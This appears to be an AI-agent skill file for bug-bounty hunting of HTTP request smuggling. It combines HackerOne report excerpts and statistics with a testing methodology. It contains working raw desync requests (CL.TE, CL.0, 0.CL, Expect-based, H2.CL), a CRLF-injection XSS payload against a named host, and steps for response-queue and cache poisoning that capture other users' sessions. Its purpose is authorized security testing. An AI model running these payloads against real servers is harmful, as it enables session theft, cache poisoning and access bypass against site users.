---
name: bbhunt-request-smuggling
description: "Use for CL.TE / TE.CL / H2.CL / H2.TE desync, header framing inconsistencies and cache-poisoning via request framing. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# HTTP Request Smuggling and Desync — unified skill

> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.

## Corpus evidence — 97 valid HackerOne reports (30 paid / 31%)

Every disclosed report is valid; payment is an impact signal, not a validity test.

### Techniques ranked across ALL valid reports

| Technique | Reports |
|---|---:|
| parser confusion / normalization | 61 |
| encoding / double-encode / null byte | 46 |
| cache / CDN / unkeyed header | 39 |
| JS bundle / source-map inspection | 39 |
| internal service / port / container | 36 |
| header injection (Host / X-Forwarded / etc.) | 28 |
| Content-Type / body-format switch | 21 |
| public source-code / repo review | 17 |
| parameter pollution / duplicate keys | 17 |
| intercept & replay request in Burp | 15 |
| race / concurrency / timing | 11 |
| subdomain / DNS / cert-transparency recon | 11 |
| HTTP method / verb tampering | 11 |
| two-account / cross-account replay | 8 |
| OAST / DNS / HTTP callback proof | 8 |
| admin / privileged-role context | 8 |
| error message / stack trace probing | 7 |
| unauthenticated / removed-cookie test | 6 |
| XML / SOAP / SAML / XXE | 6 |
| fuzzing / wordlist brute force | 5 |
| JWT / token / base64 decode | 5 |
| second-order / stored / blind delivery | 4 |
| WAF / sanitizer / filter bypass | 4 |
| third-party data / paste / breach reuse | 4 |
| file upload / filename / extension | 4 |
| DOM / HTML source inspection | 2 |
|  HosT/absolute-URL reset poisoning | 2 |
| verbose debug / framework fingerprint | 2 |
| response diff / status / length comparison | 2 |
| git history / exposed .git | 2 |
| mass assignment / extra request fields | 1 |
| webhook / OAuth / SAML / integration abuse | 1 |
| cloud metadata / IAM abuse | 1 |
| redirect chain / Location header | 1 |
| API docs / Swagger / introspection | 1 |

### Parameters observed in writeups

`result` (11), `target` (6), `daemon` (6), `path` (3), `session` (3), `capture_output` (3), `body` (3), `args` (3), `domain` (2), `max-age` (2), `injected` (2), `qop` (2), `port` (2), `payload` (2), `nextnonce` (2), `jar` (2), `suffix` (2), `ci_session` (2), `text` (2), `size` (2), `buf` (2), `verify_token` (1), `expires` (1), `gerbenjavado` (1), `mode` (1), `charset` (1), `header-field` (1), `field-name` (1), `aerg` (1), `ubvhq` (1)

### Bypass primitives observed

`chunked` (163), `transfer-encoding` (151), `desync` (57), `content-type` (42), `bypass` (31), `crlf` (24), `host header` (15), `%0d%0a` (14), `bypassing` (11), `header injection` (8), `transfer encoding` (3), `bypassed` (3), `trailing space` (2), `bypasses` (2), `http method` (1), `open redirect` (1), `html-encoding` (1), `html encoding` (1), `empty value` (1), `backslash` (1), `normalizing` (1)

### Impact language observed

`localhost` (64), `token` (52), `credential` (19), `admin` (19), `password` (9), `sensitive data` (7), `unauthorized` (6), `payment` (3), `privilege escalation` (3), `exfiltration` (3), `pii` (2), `exfiltrated` (2), `account takeover` (1), `rce` (1), `internal service` (1), `arbitrary command` (1)

### Case studies — full excerpts (paid and unpaid)

#### [510152](https://hackerone.com/reports/510152) — Bypass for #488147 enables stored XSS on https://paypal.com/signin again

PayPal · $20000 · high

Due to a configuration in frontend, caching servers, it was possible for a researcher to use request smuggling to convert a page request into a cached redirect. If the cached redirect were accessed by a legitimate user, an attacker's content would be rendered instead of the requested page. While this would not impact any back-end data, this could interfere with the integrity of certain pages, including potential interference with the sign-in page. PayPal worked with the researcher and our technical teams to remediate the issue and confirm there was no evidence of real-world attacks. I've posted a full writeup over at

#### [488147](https://hackerone.com/reports/488147) — Stored XSS on https://paypal.com/signin via cache poisoning

PayPal · $18900 · high

Due to a configuration in frontend, caching servers, it was possible for a researcher to use request smuggling to convert a page request into a cached redirect. If the cached redirect were accessed by a legitimate user, an attacker's content would be rendered instead of the requested page. While this would not impact any back-end data, this could interfere with the integrity of certain pages, including potential interference with the sign-in page. PayPal worked with the researcher and our technical teams to remediate the issue and confirm there was no evidence of real-world attacks. I've posted a full writeup over at

#### [1478633](https://hackerone.com/reports/1478633) — HTTP Request Smuggling in Transform Rules using hexadecimal escape sequences in the concat() function

Cloudflare Public Bug Bounty · $6000 · critical

The Edge Rules engine used by Cloudflare Transform Rules features string modifying functions like lower() and concat(), which accepted hexadecimal-encoded characters such as ”\x0a\x0d“. This allowed for manipulation of request headers (e.g. injecting an additional header) and, as a consequence, made HTTP smuggling attack (TE.CL) possible. This vulnerability enabled an attacker to bypass security products such as Cloudflare Access and view the content of internal origin servers. This bug in hexadecimal parsing was fixed by the relevant engineering team. We rewarded this finding as critical as well as a bonus for a high quality, detailed report. Internal investigation confirmed that no other CF customer was affected by this attack. As a recommendation, we advise Cloudflare Access customers to always verify the Authorization JWT token before processing requests from the Cloudflare edge. Cloudflare's Ruleset Engine allows the use of hexadecimal escape sequences in string manipulation functions such as `concat()`. Due to a lack of output sanitation, this enabled an attacker to inject newlines into the header value. By creating a dynamic header rewrite rule with the value `concat("-", "\x0d\x0aTransfer-Encoding: chunked")`, it was possible to change the transfer encoding of the request. When combined with a POST body such as `0\r\n\r\nGET / HTTP/1.1\r\nHost: internal.example.com\r\n\

#### [2280391](https://hackerone.com/reports/2280391) — Possibility of Request smuggling attack

Internet Bug Bounty · $4660 · high

Request smuggling was possible by throwing an IOException with the upper size limit of the trailer header. Confirmed with tomcat version 9.0.82. * example ~~~~~~~~~~~~~~~~~~ POST /examples/test.jsp HTTP/1.1 Host: www.example.co.jp Content-Type: application/x-www-form-urlencoded Transfer-Encoding: chunked Connection: KeepAlive 5 foo=b 2 ar 0 testtrailer: aaaaa...(large size) a: GET /examples/?this_is_attack HTTP/1.1 Host: attack ~~~~~~~~~~~~~~~~~~ * Reproduce with the following steps: The result of curl is two HTTP responses("/examples/test.jsp" and "/examples/?this_is_attack"). Two requests are recorded in the Tomcat access log. ## Impact A trailer header that exceeded the header size limit could cause Tomcat to treat a single request as multiple requests leading to the possibility of request smuggling when behind a reverse proxy.

#### [2327341](https://hackerone.com/reports/2327341) — CVE-2024-21733 Apache Tomcat HTTP Request Smuggling (Client- Side Desync) (CWE: 444)

Internet Bug Bounty · $4660 · high

Apache Tomcat from 8.5.7 through 8.5.63, from 9.0.0-M11 through 9.0.43 are vulnerable to client-side de-sync attacks. Client-side de-sync (CSD) vulnerabilities occur when a web server fails to correctly process the Content-Length of POST requests. By exploiting this behavior, an attacker can force a victim's browser to de-synchronize its connection with the website, causing sensitive data to be smuggled from the server and/or client connections. Users are recommended to upgrade to version 8.5.64 onwards or 9.0.44 onwards, which contain a fix for the issue. PoC: ~~~~~~~~~~~~~~~~~~ POST / HTTP/1.1 Host: hostname Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: "Linux" Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Priority: u=0, i Connection: keep-alive Content-Length: 6 Content-Type: application/x-www-form-urlencoded X ~~~~~~~~~~~~~~~~~~ In some cases, this can leak sensitive data such as clear-text credentials (see attached screen

#### [737140](https://hackerone.com/reports/737140) — Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies

Slack · no bounty — still valid · critical

Hi Slack Security Team! My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a month long bounty promotion I decided to take a little of my time and gently perform recon on your platform. Specifically the area of interest I focus in is HTTP Request Smuggling. I developed tooling to actively target some advanced HTTP Smuggling exploits and ran it on your in-scope assets. In my research I stumbled across a finding that I consider extremely critical not only for Slack but for all customers and organizations which share their privatedata/channels/conversations on Slack. The bug chain is as follows: 1) HTTP Request Smuggling CTLE to Arbitrary Request Hijacking (Poisoned Socket) on `slackb.com` 2) Request Hijack forces victim HTTP requests to instead use `GET HTTP/1.1` on `slackb.com` 3) A request of `GET HTTP/1.1` on the backend server socket results in a 301 redirect to ` with slack cookies (most importantly the `d` cookie) 4) Me with my Burp Collaborator steals victims cookies by using a collaborator server as the defined <URL> in the attack 5) Me (if I were evil) collects massive amounts of `d` session cookies and steals any/all possble Slack user/organization data from victim sessions So let's start from the beginning. I was running `smuggler -u running my array of exhaustive tests when I stumbled upon a failure with test: `space1` (s

#### [740037](https://hackerone.com/reports/740037) — Request smuggling on admin-official.line.me could lead to account takeover

LY Corporation · no bounty — still valid · high

The reporter identified a request smuggling issue on admin-official.line.me [(TE.CL-type).]( The reporter clearly illustrated the impact without putting our users at risk or affecting the stability of our service. For this we would like to thank @shaolin_tw! This issue was the result of how our load balancers were forwarding requests to the backend services. It had widespread influence and the report allowed us to resolve the issue internally, as well as make the vendor of the load balancers aware of this possible issue when using their product. The contents of the report allowed us to identify and prevent similar issues elsewhere in our infrastructure

### Recurring approach patterns from real reports

- 2× in this poc i was able to massive redirect users to a domain under my control but other scenarios are also possible like the ones described here
- 1× so i found a http response splitting issue in your website
- 1× poc firefox after sending the request through firefox this query is saved in cache and using a small trick can be made to work it in another browser
- 1× these defects represent a security concern when httpd is participating in any chain of proxies or interacting with back end application servers either through mod proxy or using conventional cgi mechanisms
- 1× after adding to cart step there is no checking step
- 1× in starting from these past studies i studied apache nginx varnish source code i discovered that a lot of smuggling problems were still present found new ones based on overflows for the size attributes previous works were mostly based on doubling length information and expanded my works on golang nodejs pound haproxy jetty tomcat apache traffic server
- 1× if you ask my opinion this is one of the most problematic issue i found on these years
- 1× cve httpd apache http request parsing whitespace defects problems with cr ff vtab and others strange characeters in parsing http messages especially the space before colon problem
- 1× during testing there was one such case of this happening and the burp collaborator manages to posion someone from los angeles california f622459 f622460 in order to prevent affecting more innocent users i stopped further testing after coming with the above proof of concept which should be sufficent to proof the existence of the vulnerability
- 1× in addition i noticed there was a wordpress login page but seems like it requires a specially configured browser to access the sso
- 1× my name is evan and i m a first time bug hunter to your platform because you guys were running a month long bounty promotion i decided to take a little of my time and gently perform recon on your platform
- 1× in my research i stumbled across a finding that i consider extremely critical not only for slack but for all customers and organizations which share their privatedata channels conversations on slack
- 1× i was running smuggler u running my array of exhaustive tests when i stumbled upon a failure with test space1 see below f633736 the space1 tests checks for http desync with the following payload f633737 this testcase failed on testing a clte and not a tecl
- 1× i am really happy i found this for you guys so that it can be dealt with asap
- 1× the reporter identified a request smuggling issue on admin official line me te cl type the reporter clearly illustrated the impact without putting our users at risk or affecting the stability of our service
- 1× http smuggling dashboard fortmatic png we will notice i was able to cause the next valid request to error out returning valuable details
- 1× squid increases the upgrade to rfc7230 specification with implementation of the majority of message parsing updates
- 1× i m pretty sure this issue will soon be discovered by other bounty hunters
- 1× when evaluating your platform i ve found one asset that falls victim to http smuggling attacks that result in pii information leakage session takeover victim request hijacking forging and forced victim redirection to attacker endpoint
- 1× summary http request smuggling vulnerabilities arise when websites route http requests through webservers with inconsistent http parsing
- 1× description by sending an ambiguous request on the rails application on launchpad 37signals com an attacker can desynchronise frontend and backend servers leaving the socket to the backend server poisoned with a harmful response
- 1× the desync occurs when sending a request with a content length header and a valid transfer encoding header followed by an invalid transfer encoding header
- 1× summary add summary of the vulnerability apparently node js converts cr in http request headers to hyphen before parsing
- 1× f1124380 doing the redirect mentioned above using my own pqp mx domain i was able to receive some connections

## Corpus-backed method (this class)

1. Fingerprint the chain (CDN, reverse proxy, origin) — desync needs two parsers that disagree.
2. Run bounded smuggling probes with unique markers; avoid sustained or destructive requests.
3. Classify the desync variant from the response/timing pattern, and confirm with a harmless second request that observes the smuggled prefix.
4. Correlate with cache behaviour: an unkeyed header plus desync can poison a shared response.
5. Prove a concrete consequence (another user's response, cache poisoning, ACL bypass), not just a timeout.

### Signals

- Proxy/CDN in front of an origin with different HTTP parsing
- Duplicate Content-Length or both CL and Transfer-Encoding
- Timeout/desync behaviour on malformed framed requests

### Kill criteria

- Only a timeout with no observable cross-request effect.
- Single parser / no intermediary — smuggling cannot occur.
- Program excludes DoS-style or destabilizing request tests.

### Escalation chains

- Smuggling -> cache poisoning -> cross-user page takeover.
- Desync -> ACL bypass -> internal endpoint access.

### Probes

- CL.TE / TE.CL probes with unique marker; H2.CL and H2.TE on HTTP/2 frontends; observe with a follow-up request.

### Veteran tip

Parser confusion and cache headers dominate the valid writeups; treat the intermediary, not the app, as the target.

## Unified upstream methodology (complete, deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Identify proxy/CDN + origin stack and HTTP version handling.
- Test CL.TE, TE.CL, TE.TE obfuscation, and HTTP/2 downgrade desync.
- Use timing-based and differential probes before exploitation.
- Check connection reuse, pipelining, and hop-by-hop headers.

### Deeper checklist

- Identify proxy/CDN + origin stacks and HTTP version handling.
- Test CL.TE, TE.CL, TE.TE obfuscation, and HTTP/2 downgrade desync.
- Use timing-based and differential probes before attempting exploitation.
- Check connection reuse, pipelining, and hop-by-hop header handling.
- Demonstrate a controlled impact: poisoning another user's request or bypassing controls.
- Keep payloads minimal and avoid disrupting production traffic.

### A. Discovery checklist — concrete places, params, headers, infra signals to look

- Map the full request chain before fuzzing: client -> CDN/WAF -> reverse proxy -> origin. Desync is a property of the chain, not one host. Record `Server`, `Via`, `X-Cache`, `CF-Cache-Status`, `X-Amzn-Trace-Id`, `X-Nf-Request-Id`, `X-Served-By` on every response to identify each hop.
- Fingerprint the upstream HTTP version. If the edge speaks h2 to the client but downgrades to HTTP/1.1 upstream, you have a fourth length source (H2) and CL/TE parser-diff tricks apply again. Send the same path over HTTP/1.1 and HTTP/2 in Burp Repeater (Inspector -> Request Attributes -> protocol) and diff the responses.
- Target endpoints likely to be on a shared connection pool: static assets (`/assets/*`, `/resources/*`, `/js/*`, `robots.txt`, `favicon.ico`), `/logout`, login redirects, any 30x-redirecting path. Early-response gadgets are what make 0.CL exploitable.
- Note WAF fingerprints that mean classic probes will be filtered: regex blocking of obfuscated `Transfer-Encoding`, requests with embedded `GET /... HTTP/1.1` in a body, or timing-based probes. If classic CL.TE fails on a hardened edge, pivot to parser-discrepancy detection instead of concluding "not vulnerable."
- Look for cloud-proxy infra with known parser quirks: AWS ALB in front of IIS (H-V discrepancy on malformed `Host`), web VPNs, and WAFs that rewrite requests. Kettle notes AWS declined to patch the ALB/IIS issue centrally; hardening knobs are `routing.http.drop_invalid_header_fields.enabled` and `routing.http.desync_mitigation_mode = strictest`.
- Check whether the origin ignores `Content-Length` on GET/HEAD/OPTIONS (implicit-zero, "0" length interpretation). A valid request with a body that the front-end counts but the back-end ignores is CL.0 — browser-deliverable.
- Inventory early-response gadgets per server family: nginx static files respond before reading the full body; IIS throws on reserved device names (`/con`, `/nul`, `/aux`, `COM1`); server-level redirects; `Expect: 100-continue` behavior. Apache closes on errors and is a poor 0.CL target.
- Probe `Expect: 100-continue` explicitly — both vanilla and obfuscated forms (`Expect: y 100-continue`, `Expect:` with a leading space/newline before the value) produced 0.CL and CL.0 desyncs throughout 2025 research.

### Signals and surfaces

### Signal

- Reports: **101** · paid: **31**
- Median bounty **$1,800** · p90 **$6,000** · max **$20,000** · total **$104,040**
- Median upvotes **18**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| PayPal | 2 | $38,900 | 3372 |
| Internet Bug Bounty | 15 | $31,980 | 485 |
| Cloudflare Public Bug Bounty | 3 | $10,600 | 216 |
| Basecamp | 3 | $7,500 | 355 |
| Mail.ru | 5 | $5,000 | 274 |
| New Relic | 1 | $3,000 | 490 |
| Airbnb | 1 | $2,500 | 37 |
| Shopify | 1 | $800 | 136 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`any endpoint behind CDN/proxy` `login` `API gateway` `static assets`

### Techniques, payloads and bypasses

### Payloads & probes

- CL.TE -> `Content-Length: 13` + `Transfer-Encoding: chunked`
- TE.CL -> chunked body with a smaller Content-Length
- TE.TE -> `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked`
- HTTP/2 -> `Transfer-Encoding: chunked` injected as a header

### Bypass tricks

- Obfuscate TE with case, spaces, tabs, and duplicate headers.
- Exploit front-end/back-end parser differences in header folding.
- Use cache deception/poisoning to prove impact.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Bypass for #488147 enables stored XSS on https://paypal.com/signin again** — `#510152` · PayPal · $20,000 · ▲2687
  > I've posted a full writeup over at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn
- **Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies** — `#737140` · Slack · $0 · ▲870
  > The CLTE issue found on slackb.com is when the frontend server interprets the request sized using `Content-Length` and the backend server interprets the request using the `Transfer-Encoding: chunked` method.
- **Request smuggling on admin-official.line.me could lead to account takeover** — `#740037` · LY Corporation · $0 · ▲565
  > The reporter identified a request smuggling issue on admin-official.line.me [(TE.CL-type).](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) The reporter clearly illustrated the impact without putting our users at risk or…
- **Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com** — `#771666` · Eternal · $0 · ▲559
  > It appears when you smuggle and hijack an HTTP request and you change the request endpoint to be: `https://some.host.name/desync/` on the request line the backend server should never see a request like this because the frontend server immediately returns `404…
- **HTTP request Smuggling** — `#867952` · Helium · $0 · ▲300
  > console.helium.com s vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.
- **HTTP Request Smuggling on https://labs.data.gov** — `#726773` · GSA Bounty · $750 · ▲160
  > The application appears to be vulnerable to HTTP request smuggling due to a disagreement between the front-end and back-end server, where the front-end server uses the Transfer-Encoding header to determine content in the HTTP body, but back-end server uses…
- **HTTP Response Header Injection in shopify/pitchfork + Rack 3** — `#2279572` · Shopify · $800 · ▲136
  > Header injection succeeds in case of `r\n` and `\n`.
- **HTTP Request Smuggling due to CR-to-Hyphen conversion** — `#922597` · Node.js · $0 · ▲134
  > Node then silently discards the expected 42 bytes of the body of the first request, and thus starts parsing the 2nd request from GET /node sees this.
- **Improper HTTP header block termination in llhttp** — `#2054283` · Node.js · $0 · ▲122
  > A flaw in Node.js 20's HTTP parser allows improper termination of HTTP/1 headers using `\r\n\rX` instead of the required `\r\n\r\n`.
- **HTTP Request Smuggling in Transform Rules using hexadecimal escape sequences in the concat() function** — `#1478633` · Cloudflare Public Bug Bounty · $6,000 · ▲116
  > When combined with a POST body such as `0\r\n\r\nGET / HTTP/1.1\r\nHost: internal.example.com\r\n\r\n` it made HTTP request smuggling extremely trivial.
- **Possibility of Request smuggling attack** — `#2280391` · Internet Bug Bounty · $4,660 · ▲93
  > A trailer header that exceeded the header size limit could cause Tomcat to treat a single request as multiple requests leading to the possibility of request smuggling when behind a reverse proxy.
- **Pause-based desync in Apache HTTPD** — `#1667974` · Internet Bug Bounty · $4,000 · ▲74
  > This vulnerability is described in detail in my whitepaper here: https://portswigger.net/research/browser-powered-desync-attacks pause
- **HTTP Smuggling multiple issues in Squid 3.x & squid 4.x** — `#758445` · Internet Bug Bounty · $0 · ▲74
  > For issues ` 3` & ` 4` I'm pretty sure that I will make reports later.
- **HTTP SMUGGLING EXPOSED HMAC/DOS** — `#753939` · Magic · $0 · ▲74
  > Using the transfer-encoding header and following it with a zero.
- **CVE-2024-21733 Apache Tomcat HTTP Request Smuggling (Client- Side Desync) (CWE: 444)** — `#2327341` · Internet Bug Bounty · $4,660 · ▲57
  > Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng, / ;q=0.8,application/signed-exchange;v=b3;q=0.7
- **HTTP Request Smuggling via Unsanitized Hop-by-Hop Headers** — `#3622877` · Cloudflare Public Bug Bounty · $1,500 · ▲54
  > Pingora could forward h2c upgrade requests in HTTP/1 to upstream servers, allowing subsequent h2c requests over the upgraded connection to bypass request-level filters applied by the proxy.
- **Potential HTTP Request Smuggling in ruby webrick** — `#965267` · Ruby · $0 · ▲53
  > When using webrick as a http server, a attacker may use a header to fake a legal header.
- **Request Smuggling in Apache Tomcat (Important, CVE-2023-45648)** — `#2299692` · Internet Bug Bounty · $4,660 · ▲51
  > If we send the following payload, the headers of the second request (Line 12-15) will be regarded as the trailer section of the first request, while the content of the second request (Line 17-19) is processed as the second request.
- **HTTP Request Smuggling via Connection: close<TAB> in Node.js llhttp parser** — `#3723248` · Node.js · $0 · ▲49
  > In my test, a single TCP write containing a POST followed by `GET /smuggled` results in the application receiving two request events.
- **HTTP request smuggling with Origin Rules using newlines in the host_header action parameter** — `#1575912` · Cloudflare Public Bug Bounty · $3,100 · ▲46
  > The `host header` action parameter available to rulesets in the [Origin Rules API](https://developers.cloudflare.com/rules/origin-rules/) lacked sufficient input validation i.e., allowing CRLF characters.
- **Http request splitting** — `#409943` · Node.js · $0 · ▲45
  > [https://twitter.com/YShahinzadeh/status/1039396394195451904](https://twitter.com/YShahinzadeh/status/1039396394195451904)
- **HTTP Request Smuggling** — `#1120982` · U.S. Dept Of Defense · $0 · ▲40
  > Reference: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- **[m.airbnb.com] CRLF Injection** — `#197279` · Airbnb · $2,500 · ▲37
  > By using a URL-escaped character sequence, bobrov was able to inject HTTP headers into the responses of some redirects on the m.airbnb.com domain.
- **Potential HTTP Request Smuggling in nodejs** — `#1002188` · Node.js · $250 · ▲34
  > for example, we can send two `Transfer-Encoding` header field, even if one of them is false header field.
- **Improper Input Validation — HTTP Response Parser Unconditionally Accepts Bare CR in Status Line** — `#3648681` · Node.js · $0 · ▲30
  > This means a second `\r` is consumed and treated as a valid line ending, transitioning the parser to header processing without requiring the mandatory LF (`\n` / `0x0A`) that RFC 7230 §3.1.2 demands.
- **HTTP/1.1 Response Desynchronization via conflicting CL/TE headers in Proxy CONNECT** — `#3623064` · curl · $0 · ▲30
  > curl fails to prioritize the `Transfer-Encoding: chunked` header over `Content-Length` in HTTP/1.1 proxy responses (specifically 407/401 auth challenges), violating RFC 9112 Section 6.1.
- **HTTP request smuggling on Basecamp 2 allows web cache poisoning** — `#919175` · Basecamp · $0 · ▲28
  > Using HTTP request smuggling attack, It is possible to poison the cache with the off-site redirect response using `X-Forwarded-Host` request header in smuggled request.
- **Host Header Injection** — `#1098948` · Kartpay · $0 · ▲27
  > For example Joomla used to write Host header to every page without HTML Encoding like this: <link href=”http:// SERVER['HOST']” which led to cross site scripting.
- **Unauthenticated request smuggling on launchpad.37signals.com** — `#867577` · Basecamp · $0 · ▲27
  > The desync occurs when sending a request with a `Content-Length` header and a valid `Transfer-Encoding` header followed by an invalid `Transfer-Encoding` header.
- **HTTP/1.1 response framing violation and unsafe connection reuse when transfer decoding is disabled** — `#4025056` · curl · $0 · ▲26
  > libcurl can incorrectly reuse an HTTP/1.1 connection after a response containing both `Content-Length` and a non-chunked `Transfer-Encoding` when transfer decoding is disabled with `CURLOPT HTTP TRANSFER DECODING = 0L` (`--raw` behavior).

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 6× | `\r\r` |
| 4× | `\r\n` |
| 3× | `{size}` |
| 3× | `auth_digest_string_quoted()` |
| 3× | `parse_conversion()` |
| 2× | `GET https://<URL> HTTP/1.1` |
| 2× | `r\n` |
| 2× | `Connection: close\t` |
| 2× | `http.createServer()` |
| 2× | `Content-Length: 6\r\n\r\nHello A` |
| 2× | `http_req_set_reader()` |
| 2× | `http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0` |
| 2× | `is_custom_fetch_listing_match()` |
| 2× | `imap_state_listsearch_resp()` |
| 2× | `Curl_pp_readresp()` |
| 2× | `printf "POST / HTTP/1.1\r\n"\ / "Host: localhost:5000\r\n"\ / "X-Abc:\rxTransfer-Encoding: chunked\r\n"\ / "\r\n"\ / "1\r\n"\ / "A\r\n"\ / ` |
| 2× | `Response / { host: 'localhost:5000', 'x-abc': '', 'transfer-encoding': 'chunked' } / A / ---` |
| 2× | `[\r]xTransfer-Encoding: chunked[\r\n]` |
| 2× | `legit@example.com` |
| 2× | `{50}` |

### Bypass for #488147 enables stored XSS on https://paypal.com/signin again

`#510152` · PayPal · $20,000 · high · 2019-08-07 · ▲2687
> Due to a configuration in frontend, caching servers, it was possible for a researcher to use request smuggling to convert a page request into a cached redirect. If the cached redirect were accessed by a legitimate user, an attacker's content would be rendered instead of the requested page. While this would not impact any back-end data, this could interfere with the integrity of certain pages, including potential interference with the sign-in page.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Use HTTP Request Smuggler v3.0 (Burp BApp) parser-discrepancy scanning. It sends masked headers (partially hidden `Host`, duplicate `Host`, `Host:` with leading space, invalid duplicate values) and reports when a unique response appears that cannot be produced by a normal, omitted, or arbitrary masked header. Interpret:
  - V-H (visible to front-end, hidden from back-end) -> prefer CL.0; hide the `Content-Length` with a leading space so the front-end ignores it.
  - H-V (hidden from front-end, visible to back-end) -> classic CL.TE, or 0.CL when TE is blocked.
  - Status codes are irrelevant; only response *differences* matter.
- CL.0 via hidden Content-Length (V-H):
  ```
  GET /style.css HTTP/1.1
  Host: target
  Foo: bar
   Content-Length: 23

  GET /404 HTTP/1.1
  X: y
  ```
  Front-end counts the body; back-end ignores CL and parses `GET /404` as the next request. If GET-with-body is rejected, switch the method to `OPTIONS`.
- 0.CL deadlock break: find an early-response gadget. On IIS use `/con`:
  ```
  GET /con HTTP/1.1
  Host: target
   Content-Length: 7

  GET / HTTP/1.1
  X: Y
  ```
  The back-end responds before consuming the body; a following "victim" request gets sliced. Prove it with a controllable nested request line:
  ```
  GET /con HTTP/1.1
  Host: target
   Content-Length: 20

  GET / HTTP/1.1
  X: yGET /wrtz HTTP/1.1
  Host: target
  ```
  A `302 Location: /Logon?ReturnUrl=%2fwrtz` proves the hidden request line was processed.
- Double-desync 0.CL -> CL.0: request 1 poisons the connection with 0.CL, request 2 is weaponized into CL.0 and installs a prefix. Find the injected front-end header offset with `0cl-find-offset.py` (Turbo Intruder examples), but prefer a smuggle that starts before the injected headers because servers append at the end of the block. A HEAD technique then serves attacker JS to other users on the pooled connection.
- Expect-based desyncs (the dominant 2025 discovery):
  ```
  GET /logout HTTP/1.1
  Host: target
  Expect: 100-continue
  Content-Length: 291
  ```
  or obfuscated `Expect:\n 100-continue` on Akamai and `Expect: y 100-continue` on GitLab. Effects include 0.CL, CL.0, and a second response header block that defeats front-end response-header stripping (leaking `X-Nf-Cache-Key`, account IDs, version banners) plus memory/key disclosure fragments.
- H2.CL / H2.TE: send over HTTP/2 with `Content-Length: 0` and a smuggled prefix in the body; for H2.TE add `transfer-encoding: chunked`. The downgrading front-end ignores/strips H2 framing while the back-end trusts CL/TE:
  ```
  POST / HTTP/2
  Host: target
  Content-Length: 0

  GET /resources HTTP/1.1
  Host: foo
  Content-Length: 5
  x=1
  ```
- Response queue poisoning (high impact, low traffic): poison, then repeatedly fetch "your own" 404 until you capture another user's 302 or session cookie. Expect a race — tens of thousands of requests may be needed.
- Bypass WAF regexes: prefer CL.0/0.CL (valid HTTP, no obfuscated TE), switch methods GET/OPTIONS/POST, use leading whitespace in header names, duplicate headers, and LF-only line endings (RFC-9112 MAY accept a single LF) to expose parsers that deviate.

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### C. Validation / proof bar — how to confirm and avoid false positives

- A timeout alone is not proof. Require a *different response* for the same sequence: your request returns a 404 while a subsequent benign request returns a redirect or another user's data. Distinguish V-H from H-V by which server the response appears to come from (banner/header shape), not by status codes.
- Demonstrate one of: (a) a smuggled prefix changing the next request's method/path (`GPOST`, 404 on a hidden path), (b) response-queue poisoning capturing another principal's response, (c) cache poisoning of a JS/static path leading to XSS, or (d) header injection / IP spoof leading to auth bypass. A "Mystery 400" is a lead, not a finding — convert it into a controllable response.
- Replay with a unique cachebuster on cacheable paths so your probes are not served from cache — but know when to strip it: Kettle's 24M-site Cloudflare case was missed until the cache-buster was removed. Test both with and without.
- Reproduce with the connection kept alive and control the exact CL offsets. If the exploit depends on front-end-injected headers containing the client IP, triage may fail from a different IP — disclose this or move the smuggle ahead of the injected headers.
- For client-side desync, prove the attack in a real browser with a cross-origin no-cors request that poisons the browser's own connection pool; a Burp-only PoC does not establish browser-deliverability.
- Do not report theoretical parser deviations (e.g. LF-only line endings on a directly accessed server) as bounties. They matter only when that server sits behind a reverse proxy; frame them as ecosystem/defense observations.
- Record the full raw request/response pair, the HTTP version per hop, and exact byte offsets. Redact cookies/session tokens of other users captured via response-queue poisoning.

### Escalation and related chains

### Escalation chains

- Smuggling -> cache poisoning -> XSS.
- Smuggling -> auth bypass.
- Smuggling -> request capture.

### Impact Chain

```
Poison next request → access admin as victim
Steal credentials → capture victim's session
Cache poisoning → stored XSS at scale
```

---

### Related Skills & Chains

